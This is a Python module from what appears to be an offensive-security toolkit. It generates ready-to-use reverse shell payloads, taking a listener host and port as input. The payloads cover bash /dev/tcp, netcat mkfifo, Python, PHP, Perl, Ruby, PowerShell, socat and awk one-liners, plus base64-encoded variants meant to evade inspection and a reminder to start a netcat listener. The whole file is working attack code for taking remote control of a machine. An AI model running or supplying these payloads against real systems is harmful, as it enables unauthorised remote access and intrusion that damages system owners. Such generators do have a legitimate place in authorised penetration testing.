"""
Reverse Shell Payload Generator
Generates various reverse shell payloads
"""

from core.module_base import ModuleBase, ModuleType, Platform


class ReverseShellGenerator(ModuleBase):
    """
    Reverse shell payload generator
    Generates payloads in multiple languages/formats
    """

    def __init__(self):
        super().__init__()
        self.name = "reverse_shell"
        self.description = "Generate reverse shell payloads in various formats"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.PAYLOAD
        self.platform = Platform.MULTI
        self.tags = ["payload", "reverse-shell", "shells", "bash", "python", "php"]

        # Register options
        self.register_option("LHOST", "Local IP for reverse connection", required=True)
        self.register_option("LPORT", "Local port for reverse connection", required=True, default=4444)
        self.register_option("TYPE", "Payload type: bash, python, php, nc, perl, ruby, powershell, all",
                           default="all")
        self.register_option("ENCODE", "URL encode the payload", default="no", choices=["yes", "no"])
        self.register_option("OUTPUT", "Save payloads to file", default="")

    def run(self) -> bool:
        lhost = self.get_option("LHOST")
        lport = self.get_option("LPORT")
        payload_type = self.get_option("TYPE").lower()
        encode = self.get_option("ENCODE") == "yes"
        output = self.get_option("OUTPUT")

        payloads = self._generate_payloads(lhost, lport)

        if payload_type == "all":
            types_to_show = payloads.keys()
        else:
            types_to_show = [payload_type] if payload_type in payloads else []

        if not types_to_show:
            self.print_error(f"Unknown payload type: {payload_type}")
            self.print_status(f"Available: {', '.join(payloads.keys())}")
            return False

        output_lines = []

        for ptype in types_to_show:
            payload = payloads[ptype]
            if encode:
                import urllib.parse
                payload = urllib.parse.quote(payload)

            self.print_line()
            self.print_status(f"=== {ptype.upper()} ===")
            self.print_line(payload)
            output_lines.append(f"# {ptype.upper()}\n{payload}\n")

        if output:
            with open(output, "w") as f:
                f.write("\n".join(output_lines))
            self.print_good(f"Payloads saved to {output}")

        self.print_line()
        self.print_status(f"Remember to start your listener: nc -lvnp {lport}")

        return True

    def _generate_payloads(self, lhost: str, lport: int) -> dict:
        """Generate all payload types"""
        return {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",

            "bash_alt": f"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",

            "bash_b64": self._bash_b64(lhost, lport),

            "sh": f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1",

            "nc": f"nc -e /bin/bash {lhost} {lport}",

            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",

            "nc_openbsd": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",

            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

            "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",

            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

            "php_shell": f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",

            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",

            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",

            "powershell": self._powershell_payload(lhost, lport),

            "powershell_b64": self._powershell_b64(lhost, lport),

            "java": f"Runtime.getRuntime().exec(\"bash -c {{bash,-i,>&,/dev/tcp/{lhost}/{lport},0>&1}}\");",

            "xterm": f"xterm -display {lhost}:1",

            "socat": f"socat TCP:{lhost}:{lport} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",

            "awk": f"awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}' /dev/null",
        }

    def _bash_b64(self, lhost: str, lport: int) -> str:
        """Generate base64 encoded bash payload"""
        import base64
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"

    def _powershell_payload(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        return f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""

    def _powershell_b64(self, lhost: str, lport: int) -> str:
        """Generate base64 encoded PowerShell payload"""
        import base64
        ps = self._powershell_payload(lhost, lport)
        # PowerShell uses UTF-16LE encoding
        encoded = base64.b64encode(ps.encode('utf-16le')).decode()
        return f"powershell -enc {encoded}"

    def check(self) -> bool:
        """Always returns True - this is a generator"""
        return True
